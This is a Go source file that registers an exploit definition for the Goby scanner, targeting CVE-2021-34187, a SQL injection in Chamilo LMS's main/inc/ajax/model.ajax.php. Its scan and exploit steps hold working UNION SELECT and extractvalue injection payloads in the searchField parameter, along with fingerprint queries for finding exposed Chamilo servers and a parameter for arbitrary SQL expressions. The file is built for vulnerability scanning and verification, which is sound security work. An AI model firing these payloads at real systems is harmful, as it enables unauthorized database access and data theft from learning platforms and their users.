package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Chamilo model.ajax.php SQL (CVE-2021-34187)",
    "Description": "<p>Chamilo LMS is an open source online learning and collaboration system of the Chamilo Association.</p><p>The system supports the creation of teaching content, remote training and online quizzes. There is a SQL injection vulnerability in Chamilo, which originates from Chamilo's main/inc/ajax/model.ajax.php which allows SQL injection through the searchField, filters or filters2 parameters.</p>",
    "Impact": "Chamilo model.ajax.php SQL (CVE-2021-34187)",
    "Recommendation": "<p>Precompile and escape data entered by the user.</p><p>Timely upgrades: <a href=\"https://github.com/chamilo/chamilo-lms.\">https://github.com/chamilo/chamilo-lms.</a></p>",
    "Product": "Chamilo",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "Chamilo model.ajax.php 文件 SQL 漏洞 (CVE-2021-34187)",
            "Description": "<p><span style=\"color: rgb(45, 46, 47); font-size: 14px;\">Chamilo LMS是Chamilo协会的一套开源的在线学习和协作系统。</span><br></p><p><span style=\"color: rgb(45, 46, 47); font-size: 14px;\"><span style=\"color: rgb(45, 46, 47); font-size: 14px;\">该系统支持创建教学内容、远程培训和在线答题等。 Chamilo存在SQL注入漏洞，该漏洞源于Chamilo的main/inc/ajax/model.ajax.php允许通过searchField、filters或filters2参数进行SQL注入。</span><br></span></p>",
            "Impact": "<p><span style=\"color: rgb(45, 46, 47); font-size: 14px;\">该系统支持创建教学内容、远程培训和在线答题等。 Chamilo存在SQL注入漏洞，该漏洞源于Chamilo的main/inc/ajax/model.ajax.php允许通过searchField、filters或filters2参数进行SQL注入。</span><br></p>",
            "Recommendation": "<p>对用户输入的数据进行预编译和转义。</p><p>及时升级：<a href=\"https://github.com/chamilo/chamilo-lms\">https://github.com/chamilo/chamilo-lms</a>。</p>",
            "Product": "Chamilo",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Chamilo model.ajax.php SQL (CVE-2021-34187)",
            "Description": "<p>Chamilo LMS is an open source online learning and collaboration system of the Chamilo Association.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">The system supports the creation of teaching content, remote training and online quizzes. There is a SQL injection vulnerability in Chamilo, which originates from Chamilo's main/inc/ajax/model.ajax.php which allows SQL injection through the searchField, filters or filters2 parameters.</span><br></p>",
            "Impact": "Chamilo model.ajax.php SQL (CVE-2021-34187)",
            "Recommendation": "<p>Precompile and escape data entered by the user.</p><p>Timely upgrades: <a href=\"https://github.com/chamilo/chamilo-lms.\">https://github.com/chamilo/chamilo-lms.</a></p>",
            "Product": "Chamilo",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "banner=\"X-Powered-By: Chamilo\" || header=\"X-Powered-By: Chamilo\"",
    "GobyQuery": "banner=\"X-Powered-By: Chamilo\" || header=\"X-Powered-By: Chamilo\"",
    "Author": "abszse",
    "Homepage": "https://github.com/chamilo/chamilo-lms",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://murat.one/?p=118"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-34187"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202106-1913"
    ],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+md5(111))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "698d51a19d8a121ce581499d7b701668",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+extractvalue(0x0a,concat(0x0a,(md5(111)))))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "698d51a19d8a121ce581499d7b701668",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+md5(111))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "698d51a19d8a121ce581499d7b701668",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+extractvalue(0x0a,concat(0x0a,(md5(111)))))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "698d51a19d8a121ce581499d7b701668",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6874"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
